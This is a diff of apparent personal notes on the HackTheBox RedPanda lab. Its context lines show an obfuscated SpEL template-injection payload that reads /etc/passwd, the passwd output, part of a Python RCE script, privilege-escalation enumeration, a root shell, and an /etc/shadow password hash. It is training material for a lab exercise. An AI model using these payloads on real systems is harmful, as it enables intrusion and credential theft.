@@ -200,7 +200,6 @@ Multiple variable expressions can be used, if ${...} doesn't work try #{...}, *{
 ${7*7}
 You searched for: Error occured: banned characters
 
-
 *{7*7}
 You searched for: 49
 
@@ -214,7 +213,6 @@ Java - Retrieve /etc/passwd
 *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
 
 You searched for: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin woodenk:x:1000:1000:,,,:/home/woodenk:/bin/bash mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
-
 
 rev shell
 
@@ -256,8 +254,6 @@ class RCE(Cmd):
             print("%s: command not found" % (args))
 
 RCE().cmdloop()
-
-
 
 ┌──(kali㉿kali)-[~/hackthebox]
 └─$ python3 exploit_redpanda.py                                          
@@ -529,7 +525,6 @@ find / -group logs 2>/dev/null
 /home/woodenk/.ssh
 /home/woodenk/.ssh/authorized_keys
 
-
 woodenk@redpanda:/tmp/hsperfdata_woodenk$ ls -l /opt/panda_search/redpanda.log
 ls -l /opt/panda_search/redpanda.log
 -rw-rw-r-- 1 root logs 1 Nov  8 21:40 /opt/panda_search/redpanda.log
@@ -699,9 +694,7 @@ Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)
 
   => / is using 86.5% of 4.30GB
 
-
 0 updates can be applied immediately.
-
 
 The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
@@ -746,7 +739,6 @@ tomcat-docbase.8080.5643265930622448518
 vmware-root_659-4013788787
 woodenk@redpanda:/tmp$ ./pspy64s
 pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
-
 
      ██▓███    ██████  ██▓███ ▓██   ██▓
     ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
@@ -1211,14 +1203,11 @@ Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)
 
   => / is using 87.0% of 4.30GB
 
-
 0 updates can be applied immediately.
-
 
 The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
 
 Last login: Thu Jun 30 13:17:41 2022
 root@redpanda:~# id
@@ -1269,14 +1258,6 @@ usbmux:*:18822:0:99999:7:::
 woodenk:$6$48BoRAl2LvBK8Zth$vpJzroFTUyQRA/UQKu64uzNF6L7pceYAe.B14kmSgvKCvjTm6Iu/hSEZTTT8EFbGKNIbT3e2ox3qqK/MJRJIJ1:19157:0:99999:7:::
 mysql:!:19157:0:99999:7:::
 
-
-
 ```
-
-![[Pasted image 20221108153905.png]]
-
-![[Pasted image 20221108174913.png]]
-
-
 
 [[Shoppy]]
